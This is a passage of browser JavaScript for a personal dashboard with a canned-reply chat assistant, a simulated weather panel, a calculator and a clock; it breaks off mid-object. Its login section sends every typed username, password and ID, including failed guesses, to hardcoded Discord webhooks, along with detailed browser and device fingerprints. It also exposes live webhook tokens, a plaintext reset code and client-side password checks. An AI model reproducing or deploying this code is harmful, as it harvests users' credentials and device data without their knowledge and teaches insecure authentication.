            this.chatBox.scrollTop = this.chatBox.scrollHeight; // Scroll to bottom
            console.log(`Chat message added by ${sender}: "${text}"`);
        },

        sendMessage: function() {
            const message = this.chatInput.value.trim();
            if (!message) return;

            this.addMessage(message, 'user');
            this.chatInput.value = '';

            setTimeout(() => this.getResponse(message), 500); // Simulate processing time
        },

        getResponse: function(userMessage) {
            const msgLower = userMessage.toLowerCase();
            let response = "I'm not sure how to respond to that. Can you rephrase?";

            if (msgLower.includes('hello') || msgLower.includes('hi')) {
                response = "Hello there! How can I assist you today?";
            } else if (msgLower.includes('weather')) {
                response = "I can show you a simulated weather forecast. Open the 'Weather Forecast' panel!";
            } else if (msgLower.includes('reminders')) {
                response = "You can manage your reminders in the 'Reminder System' panel. I'll even send you notifications!";
            } else if (msgLower.includes('settings')) {
                response = "The 'Settings' panel allows you to customize theme, font size, and animations.";
            } else if (msgLower.includes('time')) {
                const now = new Date();
                response = `The current time is ${now.toLocaleTimeString()}.`;
            } else if (msgLower.includes('date')) {
                const now = new Date();
                response = `Today's date is ${now.toLocaleDateString()}.`;
            } else if (msgLower.includes('who are you') || msgLower.includes('what are you')) {
                response = "I am your Private System Virtual Assistant, designed to help you navigate and utilize this dashboard.";
            } else if (msgLower.includes('dashboard features')) {
                response = "This dashboard has many features like calendar, notes, system diagnostics, task manager, and more! Check out the buttons below.";
            } else if (msgLower.includes('thank you') || msgLower.includes('thanks')) {
                response = "You're welcome! Happy to help.";
            } else if (msgLower.includes('calculator')) {
                response = "You can find a basic calculator in the 'Calculator' panel.";
            } else if (msgLower.includes('map') && msgLower.includes('school')) {
                response = "The 'School Building Map Information' panel is coming soon with detailed maps!";
            } else if (msgLower.includes('vpn')) {
                response = "The 'VPN Websites' panel lists some VPN services. Remember to use them responsibly.";
            }


            this.addMessage(response, 'assistant');
        }
      },

      // Weather Forecast (Simulated)
      weather: {
        weatherForecastGrid: null,
        weatherData: [],

        init: function() {
            console.log("Simulated weather forecast initializing...");
            this.weatherForecastGrid = document.getElementById('weatherForecastGrid');
            this.generateWeatherData();
            this.renderWeather();
            console.log("Simulated weather forecast initialized.");
        },

        generateWeatherData: function() {
            const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
            const conditions = [
                { text: 'Sunny', icon: '☀️' },
                { text: 'Partly Cloudy', icon: '⛅' },
                { text: 'Cloudy', icon: '☁️' },
                { text: 'Rainy', icon: '🌧️' },
                { text: 'Thunderstorms', icon: '⛈️' },
                { text: 'Snowy', icon: '❄️' }
            ];
            
            const todayIndex = new Date().getDay(); // 0 for Sunday, 1 for Monday, etc.

            this.weatherData = [];
            for (let i = 0; i < 5; i++) { // 5-day forecast
                const dayOfWeek = days[(todayIndex + i) % 7];
                const highTemp = Math.floor(Math.random() * 20) + 15; // 15-35 degrees Celsius
                const lowTemp = highTemp - Math.floor(Math.random() * 10) - 5; // 5-10 degrees lower
                const condition = conditions[Math.floor(Math.random() * conditions.length)];

                this.weatherData.push({
                    day: dayOfWeek,
                    high: highTemp,
                    low: lowTemp,
                    condition: condition.text,
                    icon: condition.icon,
                    isToday: i === 0
                });
            }
            console.log("Simulated weather data generated.");
        },

        renderWeather: function() {
            this.weatherForecastGrid.innerHTML = '';
            this.weatherData.forEach(day => {
                const dayDiv = document.createElement('div');
                dayDiv.classList.add('weather-day');
                if (day.isToday) dayDiv.classList.add('today-weather');
                dayDiv.innerHTML = `
                    <h3>${day.isToday ? 'Today' : day.day}</h3>
                    <div class="weather-icon">${day.icon}</div>
                    <div class="weather-temp">${day.high}°C / ${day.low}°C</div>
                    <div class="weather-desc">${day.condition}</div>
                `;
                this.weatherForecastGrid.appendChild(dayDiv);
            });
            console.log("Simulated weather rendered.");
        }
      },

      // Calculator
      calculator: {
        display: null,
        currentInput: '0',
        operator: null,
        prevValue: null,
        shouldResetDisplay: false,

        init: function() {
            console.log("Calculator initializing...");
            this.display = document.getElementById('calcDisplay');
            const buttons = document.querySelectorAll('.calculator-grid button');
            buttons.forEach(button => {
                button.addEventListener('click', (e) => this.handleButtonClick(e.target.dataset.value));
            });
            this.updateDisplay();
            console.log("Calculator initialized.");
        },

        updateDisplay: function() {
            this.display.textContent = this.currentInput;
        },

        handleButtonClick: function(value) {
            if (value >= '0' && value <= '9' || value === '.') {
                this.appendNumber(value);
            } else if (['+', '-', '*', '/', '%'].includes(value)) {
                this.chooseOperator(value);
            } else if (value === '=') {
                this.calculate();
            } else if (value === 'C') {
                this.clear();
            } else if (value === 'neg') {
                this.toggleNegative();
            }
            this.updateDisplay();
            console.log(`Calculator button clicked: ${value}, current input: ${this.currentInput}`);
        },

        appendNumber: function(number) {
            if (this.shouldResetDisplay) {
                this.currentInput = number;
                this.shouldResetDisplay = false;
            } else if (number === '.' && this.currentInput.includes('.')) {
                return; // Only one decimal point allowed
            } else if (this.currentInput === '0' && number !== '.') {
                this.currentInput = number;
            } else {
                this.currentInput += number;
            }
        },

        chooseOperator: function(nextOperator) {
            if (this.prevValue === null) {
                this.prevValue = parseFloat(this.currentInput);
            } else if (!this.shouldResetDisplay) {
                this.calculate();
            }
            this.operator = nextOperator;
            this.shouldResetDisplay = true;
            console.log(`Operator chosen: ${nextOperator}`);
        },

        calculate: function() {
            let calculation;
            const current = parseFloat(this.currentInput);
            const prev = parseFloat(this.prevValue);

            if (isNaN(prev) || isNaN(current)) return;

            switch (this.operator) {
                case '+': calculation = prev + current; break;
                case '-': calculation = prev - current; break;
                case '*': calculation = prev * current; break;
                case '/': calculation = prev / current; break;
                case '%': calculation = prev % current; break;
                default: return;
            }

            this.currentInput = calculation.toString();
            this.operator = null;
            this.prevValue = null;
            this.shouldResetDisplay = true;
            console.log(`Calculation performed. Result: ${this.currentInput}`);
        },

        clear: function() {
            this.currentInput = '0';
            this.operator = null;
            this.prevValue = null;
            this.shouldResetDisplay = false;
            console.log("Calculator cleared.");
        },

        toggleNegative: function() {
            if (this.currentInput === '0') return;
            this.currentInput = (parseFloat(this.currentInput) * -1).toString();
            console.log(`Toggled negative: ${this.currentInput}`);
        }
      },

      // Analog Clock
      analogClock: {
        hourHand: null,
        minuteHand: null,
        secondHand: null,

        init: function() {
            console.log("Analog clock initializing...");
            this.hourHand = document.getElementById('hourHand');
            this.minuteHand = document.getElementById('minuteHand');
            this.secondHand = document.getElementById('secondHand');
            this.updateClockHands(); // Initial update
            setInterval(() => this.updateClockHands(), 1000); // Update every second
            console.log("Analog clock initialized.");
        },

        updateClockHands: function() {
            const now = new Date();
            const seconds = now.getSeconds();
            const minutes = now.getMinutes();
            const hours = now.getHours();

            // Calculate degrees for each hand
            const secondDegrees = (seconds / 60) * 360;
            const minuteDegrees = (minutes / 60) * 360 + (seconds / 60) * 6; // Add seconds for smooth transition
            const hourDegrees = (hours / 12) * 360 + (minutes / 60) * 30; // Add minutes for smooth transition

            // Apply rotations
            this.secondHand.style.transform = `rotate(${secondDegrees}deg)`;
            this.minuteHand.style.transform = `rotate(${minuteDegrees}deg)`;
            this.hourHand.style.transform = `rotate(${hourDegrees}deg)`;
        }
      },

      // Dynamically create panel visibility checkboxes in settings
      setupPanelVisibilityControls: function() {
          const panelVisibilitySettingsDiv = document.getElementById('panelVisibilitySettings');
          if (!panelVisibilitySettingsDiv) return;

          const allPanels = document.querySelectorAll('#infoPanelsContainer .info-panel');
          panelVisibilitySettingsDiv.innerHTML = ''; // Clear previous
          allPanels.forEach(panel => {
              const panelId = panel.id;
              const panelName = panel.querySelector('h2').textContent; // Get name from H2
              const checkboxId = `toggle${panelId}`;

              const div = document.createElement('div');
              const input = document.createElement('input');
              input.type = 'checkbox';
              input.id = checkboxId;
              input.checked = (this.settings.panelVisibility[panelId] === undefined) ? true : this.settings.panelVisibility[panelId]; // Default to true if not set

              const label = document.createElement('label');
              label.htmlFor = checkboxId;
              label.textContent = panelName;

              div.appendChild(input);
              div.appendChild(label);
              panelVisibilitySettingsDiv.appendChild(div);

              input.addEventListener('change', (e) => {
                  this.settings.panelVisibility[panelId] = e.target.checked;
                  // Don't save immediately, wait for 'Save Panel Visibility' button click or apply instantly
                  document.getElementById(panelId).style.display = e.target.checked ? 'block' : 'none';
              });
          });
          console.log("Panel visibility controls set up.");
      },

      // Apply initial panel visibility based on saved settings
      applyDefaultPanelVisibility: function() {
          document.querySelectorAll('#infoPanelsContainer .info-panel').forEach(panel => {
              const panelId = panel.id;
              // If not in settings, default to visible. Otherwise, use saved preference.
              const isVisible = (this.settings.panelVisibility[panelId] === undefined) ? false : this.settings.panelVisibility[panelId];
              panel.style.display = isVisible ? 'block' : 'none';
          });
          console.log("Default panel visibility applied.");
      }
    }; // End dashboard object

    // Login System JavaScript
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhooks for the new logging systems
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      // Original webhooks
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 5;
      let users = [];
      let loginTime = null;

      // Show/hide password toggle
      showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
      });

      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => res.json())
        .then(data => {
          users = data;
          console.log("User whitelist loaded successfully.");
        })
        .catch(err => {
          users = [];
          console.error('Failed to load user JSON data:', err);
          errorMsg.textContent = 'Failed to load user data. Please try again later.';
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch (e) {
          console.warn("Could not get WebGL renderer:", e);
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            console.log("Battery status retrieved.");
            return battery;
          } catch (e) {
            console.warn("Could not get battery status:", e);
            return null;
          }
        }
        console.log("Battery API not supported.");
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
          console.log(`Webhook sent to ${url}`);
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        // Simulate IP address, VPN/Proxy detection
        const mockIpAddress = `192.168.1.${Math.floor(Math.random() * 255)}`; // Local IP
        const mockVpnDetected = Math.random() > 0.8; // 20% chance of VPN detection
        const mockProxyDetected = Math.random() > 0.9; // 10% chance of Proxy detection

        return {
          user: {
            ...user,
            ipAddress: mockIpAddress,
            vpnDetected: mockVpnDetected,
            proxyDetected: mockProxyDetected,
            // Adding more mock data for session logging realism
            ipv6Address: Math.random() > 0.5 ? '2001:0db8:85a3:0000:0000:8a2e:0370:7334' : 'N/A',
            localIPs: ['192.168.1.100', '10.0.0.5']
          },
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = {
          title: "Username Logging",
          color: 0x3498db,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(name, password) {
        const embed = {
          title: "Password Logging",
          color: 0xe74c3c,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(name, identifier) {
        const embed = {
          title: "Identifier Logging",
          color: 0x2ecc71,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(name, username) {
        const embed = {
          title: "Invalid Username Logging",
          color: 0xf39c12,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(name, password) {
        const embed = {
          title: "Invalid Password Logging",
          color: 0xe67e22,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = {
          title: "Invalid Identifier Logging",
          color: 0xd35400,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempts Counter Logging",
          color: 0x9b59b6,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded Logging",
          color: 0xc0392b,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Original embed builders (unchanged)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true }
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },

            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },

            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },

            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },

            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        // Mock session data for demonstration
        const mockPagesVisited = ['Dashboard', 'Calendar', 'Notes', 'Settings'];
        const mockActionsPerformed = ['Opened Panel: Settings', 'Added Reminder', 'Toggled Light Mode'];
        const mockErrorsEncountered = [];
        const mockWarnings = [];
        const mockRoleChanges = [];
        const mockPermissionChanges = [];
        const mockClicks = Math.floor(Math.random() * 50) + 10;
        const mockFormSubmissions = Math.floor(Math.random() * 5);
        const mockIdleTime = `${Math.floor(Math.random() * 10)}m ${Math.floor(Math.random() * 59)}s`;
        const mockActiveTime = `${Math.floor(Math.random() * 30)}m ${Math.floor(Math.random() * 59)}s`;
        const mockTabFocusTime = `${Math.floor(Math.random() * 25)}m ${Math.floor(Math.random() * 59)}s`;


        const logoutTime = new Date(new Date(data.loginTime).getTime() + (Math.random() * 3600000)).toISOString(); // Simulate logout within 1 hour
        const sessionDurationSeconds = (new Date(logoutTime).getTime() - new Date(data.loginTime).getTime()) / 1000;
        const sessionDuration = `${Math.floor(sessionDurationSeconds / 60)}m ${sessionDurationSeconds % 60}s`;

        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: sessionDuration || "Unknown", inline: true },

            { name: "Pages Visited", value: mockPagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: mockActionsPerformed?.join(", ") || "None", inline: false },

            { name: "Errors Encountered", value: mockErrorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: mockWarnings?.join("; ") || "None", inline: false },

            { name: "User Role Changes", value: mockRoleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: mockPermissionChanges?.join(", ") || "None", inline: false },

            { name: "Last Activity Timestamp", value: new Date().toISOString(), inline: true },
            { name: "Number of Clicks", value: mockClicks?.toString() || "0", inline: true },
            { name: "Number of Form Submissions", value: mockFormSubmissions?.toString() || "0", inline: true },

            { name: "Idle Time", value: mockIdleTime || "0s", inline: true },
            { name: "Active Time", value: mockActiveTime || "Unknown", inline: true },
            { name: "Browser Tab Focus Time", value: mockTabFocusTime || "Unknown", inline: true }
          ]
        };
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          attempts
        );

        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found.');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          return;
        }

        // Correct login
        attempts = 5;
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 15px white';

        // Log successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 webhooks:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Show dashboard and hide login
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        document.body.className = 'dashboard-body';
        
        // Update user info in dashboard
        document.getElementById('loggedInUser').textContent = user.name || user.username;
        document.getElementById('loggedInID').textContent = userID;
        
        // Initialize dashboard functionality
        dashboard.init();
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );
          
          showResetPopup();
          disableInputs();
        } else {
          if (attempts <= 3) {
            flashRedOutline(2, 400);
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = {
          title: "🔔 Reset Box Detected",
          color: 0xffff00,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);

        // Build embed for correct or incorrect code
        const resultEmbed = {
